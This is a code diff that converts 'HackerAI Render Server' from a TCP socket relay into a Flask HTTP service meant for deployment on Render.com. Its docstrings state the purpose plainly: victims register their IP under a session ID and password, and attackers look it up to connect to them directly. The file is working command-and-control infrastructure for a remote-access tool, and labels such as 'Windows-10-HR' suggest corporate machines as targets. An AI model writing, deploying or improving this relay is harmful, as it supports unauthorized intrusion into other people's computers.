@@ -1,40 +1,40 @@
 #!/usr/bin/env python3
 """
-HackerAI Render Server — Central IP Relay
-Victims register their external IP here.
-Attackers query this server to get the victim's IP and then connect directly.
+HackerAI Render Server — HTTP version for Render.com
+Provides REST API endpoints for victims to register and attackers to query.
 
-Protocol (simple JSON over TCP):
-  → REGISTER:<session_id>:<password>   - Victim registers its IP
-  → GET:<session_id>:<password>         - Attacker fetches the victim's IP
-  → LIST                                - List all active sessions
-  → QUIT                                - Disconnect
+Endpoints:
+  GET  /                    - Service info
+  POST /register            - Register a victim session
+  GET  /get/<session_id>    - Get victim IP by session ID
+  GET  /list                - List all active sessions
 
-Response format:
-  OK:<data>  or  ERR:<message>
+Deploy on Render.com:
+  - Start Command: gunicorn render_server_http:app --bind 0.0.0.0:$PORT
+  - Health Check Path: /
+  - Requirements: flask, gunicorn
 """
 
-import socket
-import threading
-import json
+import os
 import time
-import argparse
-import sys
+import json
+import threading
 from datetime import datetime
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
 
 # ─── Configuration ────────────────────────────────────────────────────────────
-DEFAULT_HOST = "0.0.0.0"
-DEFAULT_PORT = 9999
-SESSION_TIMEOUT = 300  # seconds before an unrefreshed session expires
-CLEANUP_INTERVAL = 60  # seconds between cleanup passes
+SESSION_TIMEOUT = 300   # seconds before an unrefreshed session expires
+CLEANUP_INTERVAL = 60   # seconds between cleanup passes
 
 # ─── Session Store ────────────────────────────────────────────────────────────
-active_sessions = {}       # session_id -> {ip, port, password, timestamp, label}
+active_sessions = {}
 sessions_lock = threading.Lock()
 
 
 def cleanup_expired_sessions():
-    """Periodically remove stale sessions."""
+    """Periodically remove stale sessions from the store."""
     while True:
         time.sleep(CLEANUP_INTERVAL)
         now = time.time()
@@ -48,227 +48,231 @@ def cleanup_expired_sessions():
                 del active_sessions[sid]
 
 
-# ─── Client Handler ───────────────────────────────────────────────────────────
-def handle_client(conn, addr):
-    """Handle a single client connection to the render server."""
-    print(f"[CONNECT] Client connected from {addr[0]}:{addr[1]}")
-    try:
-        while True:
-            data = conn.recv(4096)
-            if not data:
-                break
-
-            message = data.decode("utf-8", errors="replace").strip()
-            print(f"[RECV] {addr[0]}:{addr[1]} → {message}")
-
-            if message.startswith("REGISTER:"):
-                handle_register(conn, addr, message)
-            elif message.startswith("GET:"):
-                handle_get(conn, addr, message)
-            elif message == "LIST":
-                handle_list(conn)
-            elif message == "QUIT":
-                break
-            else:
-                conn.sendall(b"ERR:Unknown command\n")
-
-    except (ConnectionResetError, BrokenPipeError, OSError) as e:
-        print(f"[DISCONNECT] {addr[0]}:{addr[1]} — {e}")
-    except Exception as e:
-        print(f"[ERROR] {addr[0]}:{addr[1]} — {e}")
-    finally:
-        conn.close()
+# Start cleanup thread in background
+threading.Thread(target=cleanup_expired_sessions, daemon=True).start()
 
 
-def handle_register(conn, addr, message):
-    """REGISTER:<session_id>:<password>[:label]"""
-    parts = message.split(":", 3)
-    if len(parts) < 3:
-        conn.sendall(b"ERR:Invalid REGISTER format. Use REGISTER:<session_id>:<password>[:label]\n")
-        return
+# ─── API Routes ───────────────────────────────────────────────────────────────
 
-    session_id = parts[1]
-    password = parts[2]
-    label = parts[3] if len(parts) > 3 else "unnamed"
+@app.route("/")
+def index():
+    """Root endpoint — service info and health check."""
+    return jsonify({
+        "service": "HackerAI Render Server",
+        "version": "1.0",
+        "status": "running",
+        "active_sessions": len(active_sessions),
+        "endpoints": {
+            "POST /register": "Register a victim session. Body: {session_id, password, label?}",
+            "GET /get/<session_id>": "Get victim IP. Query: ?password=...",
+            "GET /list": "List all active sessions (no passwords)"
+        },
+        "timestamp": datetime.utcnow().isoformat()
+    })
 
+
+@app.route("/register", methods=["POST"])
+def register():
+    """
+    Register a victim session.
+
+    The victim's IP is automatically detected from the request's remote address.
+
+    Request JSON body:
+    {
+        "session_id": "my_session_01",     # Required, 3-64 chars
+        "password": "secret123",           # Required, 4-128 chars
+        "label": "Windows-10-HR"           # Optional, friendly name
+    }
+
+    Returns:
+        200: Session registered successfully
+        400: Invalid request body
+        403: Session ID already registered with different password
+    """
+    data = request.get_json(silent=True)
+    if not data:
+        return jsonify({"error": "Invalid JSON body. Send Content-Type: application/json"}), 400
+
+    session_id = data.get("session_id", "").strip()
+    password = data.get("password", "").strip()
+    label = data.get("label", "unnamed").strip()
+
+    # Validation
+    if not session_id:
+        return jsonify({"error": "session_id is required"}), 400
     if len(session_id) < 3 or len(session_id) > 64:
-        conn.sendall(b"ERR:Session ID must be 3-64 characters\n")
-        return
-
+        return jsonify({"error": "session_id must be between 3 and 64 characters"}), 400
+    if not password:
+        return jsonify({"error": "password is required"}), 400
     if len(password) < 4 or len(password) > 128:
-        conn.sendall(b"ERR:Password must be 4-128 characters\n")
-        return
+        return jsonify({"error": "password must be between 4 and 128 characters"}), 400
+
+    client_ip = request.remote_addr
 
     with sessions_lock:
-        # If session exists, verify password
+        # Check if session already exists
         if session_id in active_sessions:
-            if active_sessions[session_id]["password"] != password:
-                conn.sendall(b"ERR:Session ID already registered with different password\n")
-                return
+            existing = active_sessions[session_id]
+            if existing["password"] != password:
+                return jsonify({
+                    "error": "Session ID already registered with a different password"
+                }), 403
 
+            # Update timestamp and IP (in case victim's IP changed)
+            existing["timestamp"] = time.time()
+            existing["ip"] = client_ip
+            existing["label"] = label
+
+            print(f"[RE-REGISTER] Session '{session_id}' (label: {label}) ← {client_ip}")
+            return jsonify({
+                "status": "updated",
+                "session_id": session_id,
+                "ip": client_ip,
+                "label": label,
+                "message": "Session already existed — timestamp and IP updated"
+            })
+
+        # New session
         active_sessions[session_id] = {
-            "ip": addr[0],
-            "port": None,       # Will be set when client connects for streaming
+            "ip": client_ip,
             "password": password,
             "timestamp": time.time(),
-            "label": label,
-            "registered_from": f"{addr[0]}:{addr[1]}"
+            "label": label
         }
 
-    print(f"[REGISTER] Session '{session_id}' (label: {label}) ← {addr[0]}:{addr[1]}")
-    conn.sendall(f"OK:Session '{session_id}' registered. IP: {addr[0]}\n".encode())
+    print(f"[REGISTER] Session '{session_id}' (label: {label}) ← {client_ip}")
+    return jsonify({
+        "status": "registered",
+        "session_id": session_id,
+        "ip": client_ip,
+        "label": label
+    }), 201
 
 
-def handle_get(conn, addr, message):
-    """GET:<session_id>:<password>"""
-    parts = message.split(":", 2)
-    if len(parts) < 3:
-        conn.sendall(b"ERR:Invalid GET format. Use GET:<session_id>:<password>\n")
-        return
+@app.route("/get/<session_id>", methods=["GET"])
+def get_session(session_id):
+    """
+    Get victim connection info for a specific session.
 
-    session_id = parts[1]
-    password = parts[2]
+    Query parameters:
+        ?password=<password>    (required)
+
+    Returns:
+        200: Session found — returns IP, label, and registration time
+        403: Incorrect password
+        404: Session not found
+    """
+    password = request.args.get("password", "")
+
+    if not password:
+        return jsonify({"error": "password query parameter is required"}), 400
 
     with sessions_lock:
         if session_id not in active_sessions:
-            conn.sendall(b"ERR:Session not found\n")
-            return
+            return jsonify({"error": "Session not found"}), 404
 
         session = active_sessions[session_id]
-        if session["password"] != password:
-            conn.sendall(b"ERR:Incorrect password\n")
-            return
 
-        # Return session info as JSON
-        info = {
+        # Verify password
+        if session["password"] != password:
+            return jsonify({"error": "Incorrect password"}), 403
+
+        # Return session info
+        return jsonify({
+            "session_id": session_id,
             "ip": session["ip"],
             "label": session["label"],
-            "registered_at": datetime.fromtimestamp(session["timestamp"]).isoformat()
-        }
-        response = f"OK:{json.dumps(info)}\n"
-
-    print(f"[GET] {addr[0]}:{addr[1]} ← session '{session_id}' → {info['ip']}")
-    conn.sendall(response.encode())
+            "registered_at": datetime.fromtimestamp(session["timestamp"]).isoformat(),
+            "age_seconds": int(time.time() - session["timestamp"])
+        })
 
 
-def handle_list(conn):
-    """LIST — Return all active sessions (without passwords)."""
+@app.route("/list", methods=["GET"])
+def list_sessions():
+    """
+    List all active sessions.
+
+    Returns session IDs, IPs, labels, and ages — but NOT passwords.
+
+    Returns:
+        200: List of active sessions
+    """
     with sessions_lock:
-        if not active_sessions:
-            conn.sendall(b"OK:No active sessions\n")
-            return
-
-        lines = [f"Active Sessions ({len(active_sessions)}):"]
+        sessions_list = []
         for sid, info in sorted(active_sessions.items()):
             age_secs = int(time.time() - info["timestamp"])
-            lines.append(
-                f"  • {sid} | IP: {info['ip']} | Label: {info['label']} | "
-                f"Age: {age_secs}s ago"
-            )
-        response = "OK:\n" + "\n".join(lines) + "\n"
+            sessions_list.append({
+                "session_id": sid,
+                "ip": info["ip"],
+                "label": info["label"],
+                "age_seconds": age_secs,
+                "registered_at": datetime.fromtimestamp(info["timestamp"]).isoformat()
+            })
 
-    conn.sendall(response.encode())
+    return jsonify({
+        "count": len(sessions_list),
+        "sessions": sessions_list
+    })
 
 
-# ─── Server ───────────────────────────────────────────────────────────────────
-def start_render_server(host, port):
-    """Start the render server."""
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((host, port))
-    server.listen(20)
-    server.settimeout(1.0)
+@app.route("/delete/<session_id>", methods=["DELETE"])
+def delete_session(session_id):
+    """
+    Delete a session (cleanup).
 
+    Query parameters:
+        ?password=<password>    (required)
+
+    Returns:
+        200: Session deleted
+        403: Incorrect password
+        404: Session not found
+    """
+    password = request.args.get("password", "")
+
+    with sessions_lock:
+        if session_id not in active_sessions:
+            return jsonify({"error": "Session not found"}), 404
+
+        if active_sessions[session_id]["password"] != password:
+            return jsonify({"error": "Incorrect password"}), 403
+
+        del active_sessions[session_id]
+
+    print(f"[DELETE] Session '{session_id}' removed")
+    return jsonify({"status": "deleted", "session_id": session_id})
+
+
+# ─── Error Handlers ───────────────────────────────────────────────────────────
+
+@app.errorhandler(404)
+def not_found(e):
+    return jsonify({"error": "Endpoint not found"}), 404
+
+
+@app.errorhandler(405)
+def method_not_allowed(e):
+    return jsonify({"error": "Method not allowed"}), 405
+
+
+@app.errorhandler(500)
+def internal_error(e):
+    return jsonify({"error": "Internal server error"}), 500
+
+
+# ─── Main Entry Point ─────────────────────────────────────────────────────────
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 9999))
     print(f"""
 ╔══════════════════════════════════════════════════╗
 ║       HackerAI Render Server v1.0                ║
-║       Central IP Relay & Session Manager         ║
+║       HTTP IP Relay & Session Manager            ║
 ╠══════════════════════════════════════════════════╣
-║  Listening on: {host}:{port:<21}║
+║  Port: {str(port):<45}║
 ║  Session timeout: {SESSION_TIMEOUT}s                     ║
 ║  Cleanup interval: {CLEANUP_INTERVAL}s                    ║
 ╚══════════════════════════════════════════════════╝
     """)
-
-    # Start cleanup thread
-    cleanup_thread = threading.Thread(target=cleanup_expired_sessions, daemon=True)
-    cleanup_thread.start()
-
-    print("Waiting for connections...\n")
-
-    while True:
-        try:
-            conn, addr = server.accept()
-            client_thread = threading.Thread(
-                target=handle_client, args=(conn, addr), daemon=True
-            )
-            client_thread.start()
-        except socket.timeout:
-            continue
-        except KeyboardInterrupt:
-            print("\n[SHUTDOWN] Server stopping...")
-            break
-        except Exception as e:
-            print(f"[ERROR] Accept failed: {e}")
-
-    server.close()
-
-
-# ─── Interactive Client CLI ───────────────────────────────────────────────────
-def run_interactive_client(server_host, server_port):
-    """Connect to the render server and interact manually."""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(10)
-    try:
-        sock.connect((server_host, server_port))
-    except Exception as e:
-        print(f"[!] Could not connect to render server: {e}")
-        sys.exit(1)
-    sock.settimeout(None)
-
-    print(f"""
-╔══════════════════════════════════════════════╗
-║    HackerAI Render Client — Interactive CLI  ║
-╠══════════════════════════════════════════════╣
-║  Connected to {server_host}:{server_port:<16}║
-╚══════════════════════════════════════════════╝
-    """)
-    print("Commands:")
-    print("  REGISTER:<id>:<pass>[:label]   — Register a session")
-    print("  GET:<id>:<pass>                 — Get victim IP for session")
-    print("  LIST                            — List all active sessions")
-    print("  QUIT                            — Exit\n")
-
-    try:
-        while True:
-            cmd = input("render> ").strip()
-            if not cmd:
-                continue
-            if cmd.upper() == "QUIT":
-                sock.sendall(b"QUIT\n")
-                break
-
-            sock.sendall((cmd + "\n").encode())
-            response = sock.recv(8192).decode("utf-8", errors="replace")
-            print(response)
-    except KeyboardInterrupt:
-        print()
-    finally:
-        sock.close()
-        print("Disconnected.")
-
-
-# ─── Main ─────────────────────────────────────────────────────────────────────
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="HackerAI Render Server — Central IP Relay for Remote Desktop"
-    )
-    parser.add_argument("--host", default=DEFAULT_HOST, help=f"Bind address (default: {DEFAULT_HOST})")
-    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port (default: {DEFAULT_PORT})")
-    parser.add_argument("--client", action="store_true", help="Run as interactive CLI client instead of server")
-    args = parser.parse_args()
-
-    if args.client:
-        run_interactive_client(args.host, args.port)
-    else:
-        start_render_server(args.host, args.port)
+    app.run(host="0.0.0.0", port=port, debug=False)
